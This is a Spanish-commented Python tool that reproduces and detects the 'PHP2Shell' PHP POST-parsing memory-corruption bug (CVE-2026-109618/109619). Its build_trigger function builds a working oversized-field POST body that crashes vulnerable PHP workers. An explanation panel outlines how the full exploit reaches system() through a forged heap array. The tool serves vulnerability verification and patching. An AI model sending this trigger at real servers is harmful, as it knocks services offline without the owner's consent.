#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 PHP2Shell Repro / Verifier — CVE-2026-109618 & CVE-2026-109619
================================================================================
 Herramienta de laboratorio para REPRODUCIR y VERIFICAR la condición de la
 vulnerabilidad "PHP2Shell" (CVE-2026-109618 / CVE-2026-109619) contra un
 objetivo AUTORIZADO (tu propio contenedor del lab).

 Qué hace (y qué NO hace):
   * Envía el request desencadenante documentado: un POST
     application/x-www-form-urlencoded con un nombre de campo sobredimensionado
     (+ un campo de nombre vacío con valor binario y un campo semilla a=1),
     diseñado para agotar memory_limit DURANTE el parseo del POST (RINIT),
     antes de que se ejecute cualquier código de la aplicación.
   * Comprueba la firma del CVE: "Allowed memory size of ... exhausted ...
     in Unknown on line 0" durante PHP Request Startup.
   * Comprueba el discriminador determinista entre vulnerable y parcheado:
     el worker vulnerable crashea (segfault) al destruir el estado corrupto;
     el parcheado gestiona el OOM de forma segura y sobrevive.
   * NO ejecuta código en el objetivo, NO instala shells, NO explota nada:
     esto es una prueba de condición + detección, no un arma.

 Uso exclusivo en entornos de laboratorio sobre sistemas propios o con
 autorización explícita por escrito.

 Ejemplos:
     python3 php2shell_repro.py http://localhost:8081/
     python3 php2shell_repro.py http://localhost:8082/ --container php2shell-patched
     python3 php2shell_repro.py http://localhost:8081/ --attempts 5 --json -v

 Códigos de salida:
     0  condición de vulnerabilidad CONFIRMADA (corrupción observada)
     1  NO vulnerable (parcheado / sin corrupción)
     2  INDETERMINADO (OOM reproducido pero sin señal de corrupción, o
        el objetivo rechazó el request: revisar límites del servidor)
     3  error de ejecución (objetivo inalcanzable, etc.)
================================================================================
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

TOOL = "php2shell_repro"
VERSION = "1.0.0"

USER_AGENT = f"PHP2Shell-Lab-Repro/{VERSION} (authorized-lab-use)"

CONTENT_TYPE = "application/x-www-form-urlencoded"

# Primeras releases con el fix, por rama (php.net, aviso del 2026-10-21).
FIXED_RELEASES = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}

# Bytes que NO pueden aparecer en el filler del campo de nombre vacío:
#   0x26 '&'  -> separador de campos
#   0x3D '='  -> separador clave/valor
#   0x25 '%'  -> introduciría decodificación percent-encoding
# Si aparecen, el parser trocea el cuerpo en cientos de variables y el
# trigger deja de apuntar al bucket correcto (además de chocar con
# max_input_vars).
FORBIDDEN_BYTES = frozenset((0x26, 0x3D, 0x25))

# Tamaños por defecto calibrados para memory_limit=16M en el lab de referencia
# (los mismos órdenes de magnitud que el análisis público de Datadog):
#   campo de nombre vacío ~ 280 KiB  -> siembra el heap
#   nombre de campo       ~ 3.5 MiB  -> agota memory_limit al copiar la clave
DEFAULT_EMPTY_FIELD_BYTES = 280 * 1024
DEFAULT_FIELD_NAME_BYTES = 3500 * 1024

SEGV_PATTERN = b"exit signal Segmentation fault"

# ---------------------------------------------------------------------------
# Salida con color (respeta --no-color, NO_COLOR y stdout no-TTY)
# ---------------------------------------------------------------------------


class Style:
    """Emisión de texto con color ANSI, desactivable."""

    def __init__(self, enabled: bool) -> None:
        self.enabled = enabled

    def _c(self, code: str, text: str) -> str:
        return f"\033[{code}m{text}\033[0m" if self.enabled else text

    def bold(self, t: str) -> str: return self._c("1", t)
    def dim(self, t: str) -> str: return self._c("2", t)
    def red(self, t: str) -> str: return self._c("91", t)
    def green(self, t: str) -> str: return self._c("92", t)
    def yellow(self, t: str) -> str: return self._c("93", t)
    def blue(self, t: str) -> str: return self._c("94", t)
    def magenta(self, t: str) -> str: return self._c("95", t)
    def cyan(self, t: str) -> str: return self._c("96", t)

    def ok(self, t: str) -> str: return self._c("92", f"[+] {t}")
    def info(self, t: str) -> str: return self._c("96", f"[*] {t}")
    def warn(self, t: str) -> str: return self._c("93", f"[!] {t}")
    def fail(self, t: str) -> str: return self._c("91", f"[x] {t}")
    def step(self, t: str) -> str: return self._c("95", f"[>] {t}")


def banner(s: Style) -> None:
    bar = s.magenta("━" * 66)
    print(bar)
    print(f"  {s.bold('PHP2Shell Repro')}  {s.cyan('CVE-2026-109618')} / {s.cyan('CVE-2026-109619')}  {s.dim(f'v{VERSION}')}")
    print(f"  {s.dim('Reproducción de condición · uso exclusivo en laboratorio autorizado')}")
    print(bar)


def rule(s: Style, title: str = "") -> None:
    line = "─" * 66
    if title:
        print(f"\n{s.dim(f'── {title} '.ljust(66, '─'))}")
    else:
        print(s.dim(line))


# ---------------------------------------------------------------------------
# Modo --explain: paneles didácticos sincronizados con las fases del ataque
# (puro material de explicación: no cambia el comportamiento del trigger)
# ---------------------------------------------------------------------------


PANEL_CICLO = [
    "1. RINIT de módulos (sesiones, filtros, …)",
    "2. PARSEO DEL POST → array $_POST        ◄ el bug vive AQUÍ",
    "3. compilación del script PHP",
    "4. ejecución de la app (auth, lógica, todo)",
    "5. RSHUTDOWN: destrucción de $_POST      ◄ y detona AQUÍ",
    "",
    "El fallo ocurre en la fase 2 y su daño en la 5: tu aplicación",
    "no llega a ejecutar ni una línea. Por eso la autenticación y",
    "los firewalls de aplicación llegan tarde, y por eso el fatal",
    "error dice 'in Unknown on line 0' (no había script en marcha).",
]

PANEL_HASH = [
    "$_POST es una tabla hash de Zend: cada campo vive en un",
    "bucket (valor zval + clave zend_string). Al insertar, PHP hace:",
    "",
    "    idx = ht->nNumUsed++;            (A) cuenta la cubeta",
    "    ht->nNumOfElements++;            (B) cuenta el elemento",
    "    p->key = zend_string_init(...)   (C) AHORA reserva la clave",
    "",
    "El orden ES el bug: los contadores van antes que la memoria.",
    "El request lleva un nombre de campo de ~3.5 MB con sintaxis",
    "[x]: obliga a la ruta (C) y agota memory_limit=16M justo",
    "después de (A)/(B). Queda un bucket CONTADO pero SIN",
    "INICIALIZAR: bytes basura del heap que nadie escribió como",
    "zval. Como el libro de un hotel que dice 'habitación 42:',",
    "ocupada' cuando la habitación nunca se preparó.",
]

PANEL_DENTRO = [
    "1. Llega el POST (~3.7 MB) → empieza el parseo (fase 2).",
    "2. PHP copia la clave gigante → supera memory_limit=16M.",
    "3. Fatal error (longjmp): aborta la inserción a medias.",
    "4. La tabla dice '4 elementos' pero el bucket 4 es basura.",
    "5. RSHUTDOWN: destruir $_POST → recorre los 4 buckets.",
    "6. bucket 4: basura interpretada como zval → puntero",
    "   inválido → SIGSEGV → el worker MUERE.",
    "7. Apache crea un worker nuevo → el PID cambió.",
    "",
    "En el exploit real, el paso 6 se dirige: el atacante siembra",
    "en el heap un array falso con destructor=system() y el",
    "cleanup lo ejecuta con el comando del atacante. Este lab",
    "demuestra hasta la corrupción y su efecto (crash), sin armar",
    "esa cadena.",
]

PANEL_SOFTLIMIT = [
    "El fix no cambia el orden A→B→C: lo que cambia es el fallo.",
    "Ahora existe un límite blando: al acercarse a memory_limit,",
    "PHP ya no salta a mitad de la inserción; POSPONE el error",
    "hasta un punto seguro y la operación termina de construir",
    "sus datos. Si la memoria se agota de verdad, el worker hace",
    "_exit(137) inmediato, sin cleanup sobre estado dudoso.",
    "",
    "Por eso el parcheado muestra el MISMO fatal 'Unknown on line",
    "0' pero sin bucket huérfano: el worker sobrevive. El",
    "discriminador es el destino del worker, no el texto.",
]


def explain_panel(args: argparse.Namespace, title: str, lines: list[str]) -> None:
    """Imprime un panel didáctico (solo con --explain y sin --json)."""
    if not getattr(args, "explain_active", False):
        return
    s: Style = args._style  # type: ignore[attr-defined]
    print()
    print(s.cyan(f"  ╔═{'═' * 62}"))
    print(f"  {s.cyan('║ ')}{s.bold(s.cyan('CLASE · ' + title))}")
    print(s.cyan(f"  ╠═{'═' * 62}"))
    for line in lines:
        print(f"  {s.cyan('║ ')}{s.dim(line)}")
    print(s.cyan(f"  ╚═{'═' * 62}"))
    print()


# ---------------------------------------------------------------------------
# Modelo de resultados
# ---------------------------------------------------------------------------


@dataclass
class AttemptResult:
    """Resultado de un intento de trigger."""
    n: int
    field_name_bytes: int
    outcome: str                 # "dropped" | "oom_ok" | "ok" | "rejected" | "error" | "timeout"
    http_status: int | None
    elapsed_ms: int
    detail: str = ""
    oom_signature: bool = False
    oom_line0: bool = False


@dataclass
class ReproReport:
    """Informe completo de la verificación."""
    target: str
    started_at: str
    php_version: str | None = None
    version_label: str = "unknown"        # vulnerable-by-version / patched-by-version / unknown
    baseline_ok: bool = False
    attempts: list[AttemptResult] = field(default_factory=list)
    segfaults_before: int | None = None
    segfaults_after: int | None = None
    segfault_delta: int | None = None
    worker_before: int | None = None      # PID del worker (endpoint /whoami.php del lab)
    worker_after: int | None = None
    verdict: str = "INDETERMINATE"        # VULNERABLE | NOT_VULNERABLE | INDETERMINATE | ERROR
    verdict_reasons: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------


def http_request(url: str, data: bytes | None = None, timeout: int = 60) -> tuple[int | None, bytes, str | None]:
    """Devuelve (status, body, excepción). status=None si no hubo respuesta."""
    headers = {
        "Content-Type": CONTENT_TYPE,
        "User-Agent": USER_AGENT,
        "Connection": "close",
    }
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(), None
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return e.code, body, None
    except Exception as e:  # RemoteDisconnected, ConnectionResetError, timeout...
        return None, b"", f"{type(e).__name__}: {e}"


def parse_php_version(text: str) -> str | None:
    """Extrae 'X.Y.Z' de X-Powered-By o de un body que publique PHP_VERSION."""
    m = re.search(r"PHP[/ ](\d+\.\d+\.\d+)", text)
    return m.group(1) if m else None


def parse_worker_pid(text: str) -> int | None:
    """Extrae el PID del worker de la respuesta de /whoami.php del lab."""
    m = re.search(r"worker=(\d+)", text)
    return int(m.group(1)) if m else None


def probe_worker(target: str, whoami_path: str, timeout: int) -> int | None:
    """Consulta /whoami.php del lab y devuelve el PID del worker (o None)."""
    url = target.rstrip("/") + "/" + whoami_path.lstrip("/")
    status, body, _ = http_request(url, timeout=timeout)
    if status != 200 or not body:
        return None
    return parse_worker_pid(body.decode(errors="replace"))


def classify_version(version: str | None) -> str:
    """Clasifica la versión según la tabla de releases parcheadas."""
    if not version:
        return "unknown"
    parts = tuple(int(x) for x in version.split("."))
    branch = f"{parts[0]}.{parts[1]}"
    fixed = FIXED_RELEASES.get(branch)
    if fixed is None:
        # Ramas 8.1 y anteriores: sin release oficial -> vulnerables sin backport
        return "vulnerable-by-version (rama sin fix oficial: se requiere backport del distribuidor)"
    return "vulnerable-by-version" if parts < fixed else "patched-by-version"


# ---------------------------------------------------------------------------
# Construcción del trigger
# ---------------------------------------------------------------------------


def build_trigger(field_name_bytes: int, empty_field_bytes: int) -> bytes:
    """
    Construye el cuerpo del request desencadenante con la forma documentada:

        =[valor binario de siembra]&a=1&<nombre de campo sobredimensionado>[x]=1

      * '='      -> campo de nombre VACÍO: PHP copia el valor y luego lo libera
                    (el nombre vacío hace que no se registre) => siembra el heap.
      * 'a=1'    -> campo semilla: fuerza la creación de las HashTable.
      * 'ZZZ...[x]' -> nombre gigante con sintaxis de array: fuerza el camino
                    de inserción con clave string que actualiza los contadores
                    de la tabla ANTES de asignar la clave. Cuando la copia de
                    la clave excede memory_limit, el bucket queda a medio
                    construir (CVE-2026-109618).
    """
    alphabet = bytes(b for b in range(256) if b not in FORBIDDEN_BYTES)
    unit = alphabet + b"\x00"           # incluye NUL: el valor es binario real
    empty_value = (unit * (empty_field_bytes // len(unit) + 1))[:empty_field_bytes]

    body = bytearray()
    body += b"=" + empty_value          # campo de nombre vacío (siembra)
    body += b"&a=1"                     # semilla
    body += b"&" + b"Z" * field_name_bytes + b"[x]=1"  # trigger del OOM
    return bytes(body)


# ---------------------------------------------------------------------------
# Conteo de segfaults vía docker logs (opcional, si hay acceso a Docker)
# ---------------------------------------------------------------------------


def count_segfaults(container: str) -> int | None:
    """Cuenta 'exit signal Segmentation fault' en los logs del contenedor."""
    try:
        proc = subprocess.run(
            ["docker", "logs", container],
            capture_output=True, text=True, timeout=30,
        )
    except FileNotFoundError:
        return None
    output = (proc.stdout or "") + (proc.stderr or "")
    return output.count("exit signal Segmentation fault")


def count_oom_fatals(container: str) -> int | None:
    """Cuenta fatals de OOM 'in Unknown on line 0' en los logs del contenedor."""
    try:
        proc = subprocess.run(
            ["docker", "logs", container],
            capture_output=True, text=True, timeout=30,
        )
    except FileNotFoundError:
        return None
    output = (proc.stdout or "") + (proc.stderr or "")
    return len(re.findall(
        r"PHP Fatal error:\s+Allowed memory size of \d+ bytes exhausted.*in Unknown on line 0",
        output,
    ))


# ---------------------------------------------------------------------------
# Lógica principal
# ---------------------------------------------------------------------------


def run(args: argparse.Namespace) -> ReproReport:
    s = args._style
    report = ReproReport(
        target=args.target,
        started_at=datetime.now(timezone.utc).isoformat(),
    )
    target = args.target if args.target.endswith("/") else args.target + "/"

    # -- Fase 1: fingerprint -------------------------------------------------
    rule(s, "Fase 1/4 · Fingerprint del objetivo")
    explain_panel(args, "cómo se procesa un request PHP — y dónde vive el bug", PANEL_CICLO)
    status, body, exc = http_request(target, timeout=args.timeout)
    if status is None:
        print(s.fail(f"Objetivo inalcanzable: {exc}"))
        report.verdict = "ERROR"
        report.verdict_reasons.append(f"target inalcanzable ({exc})")
        return report
    print(s.ok(f"Objetivo accesible · HTTP {status} · {len(body)} bytes"))

    powered = ""
    try:
        with urllib.request.urlopen(target, timeout=args.timeout) as r:
            powered = r.headers.get("X-Powered-By", "")
    except Exception:
        pass
    php_version = parse_php_version(powered) or parse_php_version(body.decode(errors="replace"))
    report.php_version = php_version
    report.version_label = classify_version(php_version)
    if php_version:
        color = s.red if report.version_label.startswith("vulnerable") else s.green
        print(s.ok(f"PHP {s.bold(php_version)} detectado → {color(report.version_label)}"))
    else:
        print(s.warn("No se pudo determinar la versión de PHP (continuo sin ese dato)"))

    # Sonda de identidad del worker (solo existe en el lab)
    worker_before = probe_worker(target, args.whoami_path, args.timeout)
    report.worker_before = worker_before
    if worker_before is not None:
        print(s.ok(f"Worker identificado vía {args.whoami_path} → PID {s.bold(str(worker_before))}"))

    # -- Fase 2: baseline ----------------------------------------------------
    rule(s, "Fase 2/4 · Baseline (POST pequeño debe procesarse con normalidad)")
    status, body, exc = http_request(target, data=b"a=1", timeout=args.timeout)
    report.baseline_ok = status == 200
    if report.baseline_ok:
        print(s.ok(f"Baseline OK · HTTP {status} · el objetivo acepta POSTs normales"))
    else:
        print(s.warn(f"Baseline anómala · HTTP {status} / exc={exc} · el veredicto puede perder fiabilidad"))

    # -- Fase 3: trigger -----------------------------------------------------
    rule(s, "Fase 3/4 · Trigger (POST con nombre de campo sobredimensionado)")
    explain_panel(args, "el bug: contadores antes que memoria", PANEL_HASH)
    sizes = _size_ladder(args)
    segfaults_before = count_segfaults(args.container) if args.container else None
    oom_before = count_oom_fatals(args.container) if args.container else None
    report.segfaults_before = segfaults_before

    chosen = sizes[0]
    for n in range(1, args.attempts + 1):
        size = sizes[min(n - 1, len(sizes) - 1)]
        chosen = size
        body = build_trigger(size, args.empty_field_bytes)
        t0 = time.monotonic()
        status, resp, exc = http_request(target, data=body, timeout=args.timeout)
        elapsed = int((time.monotonic() - t0) * 1000)

        text = resp.decode(errors="replace") if resp else ""
        has_oom = "Allowed memory size of" in text
        line0 = "Unknown on line 0" in text
        rejected = _looks_rejected(text, status)

        if status is None:
            outcome = "dropped"
            detail = exc or "sin respuesta"
        elif has_oom:
            outcome = "oom_ok"
            detail = "fatal de memoria en la respuesta (worker sobrevive)"
        elif rejected:
            outcome = "rejected"
            detail = "el servidor rechazó el cuerpo (post_max_size / límites del front)"
        elif status == 200:
            outcome = "ok"
            detail = "procesado sin errores"
        else:
            outcome = "error"
            detail = f"HTTP {status}"

        att = AttemptResult(
            n=n, field_name_bytes=size, outcome=outcome, http_status=status,
            elapsed_ms=elapsed, detail=detail, oom_signature=has_oom, oom_line0=line0,
        )
        report.attempts.append(att)

        icon = {
            "dropped": s.red("conexión cerrada sin respuesta"), "oom_ok": s.yellow("fatal OOM en respuesta"),
            "rejected": s.yellow("rechazado por límites"), "ok": s.green("procesado limpio"),
            "error": s.yellow(f"HTTP {status}"), "timeout": s.yellow("timeout"),
        }.get(outcome, outcome)
        print(f"  {s.dim(f'intento {n}/{args.attempts}')}: nombre={size // 1024} KiB → {icon}  {s.dim(f'({elapsed} ms)')}")

        # Si ya hubo señal dura, no hace falta insistir más
        if outcome in ("dropped", "oom_ok"):
            break

    report.notes.append(f"tamaño de nombre elegido: {chosen} bytes")

    if any(a.outcome == "dropped" for a in report.attempts):
        explain_panel(args, "qué acaba de pasar DENTRO del worker (en ~1 s)", PANEL_DENTRO)

    # -- Fase 4: confirmación y veredicto -------------------------------------
    rule(s, "Fase 4/4 · Confirmación en logs y veredicto")

    # Sonda post-trigger: ¿sobrevive el worker que atendió el trigger?
    worker_after = probe_worker(target, args.whoami_path, args.timeout)
    report.worker_after = worker_after
    if report.worker_before is not None and worker_after is not None:
        if worker_after != report.worker_before:
            print(s.red(f"Worker {report.worker_before} → murió durante el trigger → "
                        f"reemplazado por {worker_after}"))
        else:
            print(s.green(f"Worker {worker_after} sobrevivió al trigger (mismo PID)"))

    if args.container:
        time.sleep(1.5)  # margen para que apache escriba el crash en el log
        segfaults_after = count_segfaults(args.container)
        oom_after = count_oom_fatals(args.container)
        report.segfaults_after = segfaults_after
        if segfaults_before is not None and segfaults_after is not None:
            report.segfault_delta = segfaults_after - segfaults_before
            print(s.info(f"Segfaults del worker: antes={segfaults_before} después={segfaults_after} "
                         f"(delta={report.segfault_delta})"))
        if oom_before is not None and oom_after is not None and oom_after > oom_before:
            print(s.info(f"Fatals OOM 'Unknown on line 0' nuevos en logs: +{oom_after - oom_before}"))
    else:
        print(s.dim("Sin --container: la confirmación por logs queda desactivada "
                    "(el veredicto se basa solo en señales del cliente)."))

    _verdict(args, report)
    if report.verdict == "NOT_VULNERABLE":
        explain_panel(args, "por qué el parcheado sobrevive (límite blando)", PANEL_SOFTLIMIT)
    _print_summary(args, report)
    return report


def _size_ladder(args: argparse.Namespace) -> list[int]:
    """Escalera de tamaños: el pedido, y reducciones por si el front rechaza."""
    base = args.field_name_size
    return [base, base // 2, base // 4]


def _looks_rejected(text: str, status: int | None) -> bool:
    markers = (
        "exceeds the limit", "POST Content-Length", "Request Entity Too Large",
        "Input variables exceeded",
    )
    return status == 413 or any(m in text for m in markers)


def _verdict(args: argparse.Namespace, report: ReproReport) -> None:
    """Aplica la matriz de decisión sobre las señales recolectadas."""
    dropped = any(a.outcome == "dropped" for a in report.attempts)
    oom_seen = any(a.oom_signature for a in report.attempts)
    clean = all(a.outcome == "ok" for a in report.attempts)
    rejected_only = all(a.outcome == "rejected" for a in report.attempts)
    # delta es None cuando no hay confirmación por logs (--container):
    # no hay EVIDENCIA de crash, pero tampoco prueba de lo contrario.
    if report.segfault_delta is None:
        crash = False
        no_crash = True
    else:
        crash = report.segfault_delta > 0
        no_crash = report.segfault_delta == 0
    patched_by_version = report.version_label.startswith("patched")
    vulnerable_by_version = report.version_label.startswith("vulnerable")

    if crash and (dropped or oom_seen):
        report.verdict = "VULNERABLE"
        report.verdict_reasons = [
            "El worker crasheó (segfault) al destruir el estado dejado a medias "
            "tras el OOM en el parseo del POST: el bucket sin inicializar se "
            "interpretó como datos válidos. Es la condición del CVE-2026-109618.",
            f"Versión reportada: {report.php_version or 'desconocida'} "
            f"({report.version_label})",
        ]
    elif crash:
        report.verdict = "VULNERABLE"
        report.verdict_reasons = [
            "Segfault del worker tras el trigger (corrupción de estado observada).",
        ]
    elif dropped and vulnerable_by_version and report.segfault_delta is None:
        report.verdict = "VULNERABLE"
        report.verdict_reasons = [
            "El objetivo cerró la conexión sin responder al request "
            "desencadenante (el worker murió durante el ciclo de vida del "
            "request), y la versión reportada está dentro del rango "
            "vulnerable. Ejecuta con --container para confirmar el segfault "
            "en logs.",
            f"Versión reportada: {report.php_version} ({report.version_label})",
        ]
    elif clean and no_crash:
        report.verdict = "NOT_VULNERABLE"
        reasons = [
            "El objetivo procesó el request sobredimensionado sin fatal errors "
            "y el worker sobrevivió: comportamiento del build parcheada "
            "(límite blando gestionado en punto seguro).",
        ]
        if report.segfault_delta is None:
            reasons.append("Sin --container no se han verificado segfaults en "
                           "logs; ejecútalo con --container para confirmación completa.")
        report.verdict_reasons = reasons
    elif oom_seen and no_crash and patched_by_version:
        report.verdict = "NOT_VULNERABLE"
        reasons = [
            "El fatal OOM 'in Unknown on line 0' sí aparece, pero es el "
            "límite blando del parche: la versión reportada es una release "
            "corregida y el worker sobrevivió a los intentos. El build "
            "gestiona el agotamiento sin corromper estado.",
            f"Versión reportada: {report.php_version} ({report.version_label})",
        ]
        if report.segfault_delta is None:
            reasons.append("Sin --container no se han verificado segfaults en "
                           "logs; ejecútalo con --container para confirmación completa.")
        report.verdict_reasons = reasons
    elif oom_seen and no_crash:
        report.verdict = "INDETERMINATE"
        report.verdict_reasons = [
            "Se observó un fatal OOM 'in Unknown on line 0' pero el worker NO "
            "crasheó: en builds parcheadas el límite blando se gestiona en un "
            "punto seguro. Necesitas logs/segfaults para discriminar.",
        ]
    elif rejected_only:
        report.verdict = "INDETERMINATE"
        report.verdict_reasons = [
            "El servidor rechazó el cuerpo del request (post_max_size, límites "
            "del front o max_input_vars). Ajusta --field-name-size / "
            "--empty-field-bytes al memory_limit del objetivo.",
        ]
    else:
        report.verdict = "INDETERMINATE"
        report.verdict_reasons = [
            "Señales insuficientes. Repite con --container para confirmar por "
            "logs y prueba --attempts 5.",
        ]


def _print_summary(args: argparse.Namespace, report: ReproReport) -> None:
    s = args._style
    if args.json:
        return  # el JSON lo emite main() tras restaurar stdout
    rule(s, "Veredicto")
    color = {
        "VULNERABLE": s.red, "NOT_VULNERABLE": s.green,
        "INDETERMINATE": s.yellow, "ERROR": s.fail,
    }[report.verdict]
    label = {
        "VULNERABLE": "⚠  VULNERABLE — condición del CVE reproducida",
        "NOT_VULNERABLE": "✔  NO VULNERABLE — comportamiento de build parcheada",
        "INDETERMINATE": "?  INDETERMINADO — señales insuficientes",
        "ERROR": "✘  ERROR de ejecución",
    }[report.verdict]
    print(f"\n  {s.bold(color(label))}\n")
    for reason in report.verdict_reasons:
        print(f"    {s.dim('·')} {reason}")
    if report.worker_before is not None and report.worker_after is not None:
        if report.worker_before != report.worker_after:
            print(f"    {s.dim('·')} Worker {report.worker_before} murió y fue reemplazado "
                  f"por {report.worker_after}")
        else:
            print(f"    {s.dim('·')} Worker {report.worker_after} sobrevivió al trigger")
    print()
    if report.verdict == "VULNERABLE":
        print(s.dim("    Recuerda: esta herramienta confirma la CONDICIÓN (corrupción de"))
        print(s.dim("    estado en el cleanup). No explota nada. Parchea a 8.5.12+ /"))
        print(s.dim("    8.4.27+ / 8.3.36+ / 8.2.35+ y reinicia los workers."))


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog=TOOL,
        description="Reproducción/verificación de la condición PHP2Shell "
                    "(CVE-2026-109618 / CVE-2026-109619) contra un objetivo autorizado.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Ejemplos:")[1] if "Ejemplos:" in __doc__ else None,
    )
    p.add_argument("target", help="URL base del objetivo del lab (p. ej. http://localhost:8081/)")
    p.add_argument("--field-name-size", type=int, default=DEFAULT_FIELD_NAME_BYTES,
                   metavar="BYTES", help=f"tamaño del nombre de campo gigante (default {DEFAULT_FIELD_NAME_BYTES}, calibrado p/ memory_limit=16M)")
    p.add_argument("--empty-field-bytes", type=int, default=DEFAULT_EMPTY_FIELD_BYTES,
                   metavar="BYTES", help=f"tamaño del valor del campo de nombre vacío (default {DEFAULT_EMPTY_FIELD_BYTES})")
    p.add_argument("--attempts", type=int, default=3, metavar="N", help="número de intentos del trigger (default 3)")
    p.add_argument("--timeout", type=int, default=90, metavar="SEG", help="timeout HTTP por request (default 90)")
    p.add_argument("--container", metavar="NOMBRE", default=None,
                   help="contenedor docker del lab: activa la confirmación por logs (segfaults/fatals)")
    p.add_argument("--whoami-path", metavar="RUTA", default="whoami.php",
                   help="ruta del endpoint de identidad del worker del lab (default whoami.php)")
    p.add_argument("--json", action="store_true", help="emite el informe completo en JSON al final")
    p.add_argument("--explain", action="store_true",
                   help="imprime paneles didácticos explicando qué ocurre dentro del worker en cada fase (ideal para grabar)")
    p.add_argument("--no-color", action="store_true", help="desactiva colores ANSI")
    p.add_argument("-v", "--verbose", action="store_true", help="salida detallada")
    args = p.parse_args(argv)

    args.target = args.target.rstrip("/") or args.target
    enabled = not args.no_color and sys.stdout.isatty() and "NO_COLOR" not in os.environ
    args._style = Style(enabled)  # type: ignore[attr-defined]
    args.explain_active = args.explain and not args.json
    return args


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    s: Style = args._style  # type: ignore[attr-defined]

    if not args.json:
        banner(s)
        print(s.dim("  ⚠  USO RESTRINGIDO A LABORATORIOS Y SISTEMAS AUTORIZADOS\n"))

    # En modo --json todo el progreso va a stderr y el informe puro a stdout,
    # para que la salida sea consumible por otros programas (jq, CI, etc.).
    real_stdout = sys.stdout
    if args.json:
        sys.stdout = sys.stderr
    try:
        report = run(args)
    except KeyboardInterrupt:
        print(s.warn("Interrumpido por el usuario"), file=sys.stderr)
        return 3
    except Exception as exc:  # noqa: BLE001 — fallo inesperado => error controlado
        print(s.fail(f"Error inesperado: {type(exc).__name__}: {exc}"), file=sys.stderr)
        return 3
    finally:
        sys.stdout = real_stdout

    if args.json:
        payload = {
            "tool": TOOL, "version": VERSION,
            "target": report.target,
            "started_at": report.started_at,
            "php_version": report.php_version,
            "version_label": report.version_label,
            "baseline_ok": report.baseline_ok,
            "attempts": [a.__dict__ for a in report.attempts],
            "segfaults_before": report.segfaults_before,
            "segfaults_after": report.segfaults_after,
            "segfault_delta": report.segfault_delta,
            "worker_before": report.worker_before,
            "worker_after": report.worker_after,
            "verdict": report.verdict,
            "verdict_reasons": report.verdict_reasons,
            "notes": report.notes,
        }
        print(json.dumps(payload, indent=2, ensure_ascii=False))

    return {
        "VULNERABLE": 0,
        "NOT_VULNERABLE": 1,
        "INDETERMINATE": 2,
        "ERROR": 3,
    }[report.verdict]


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
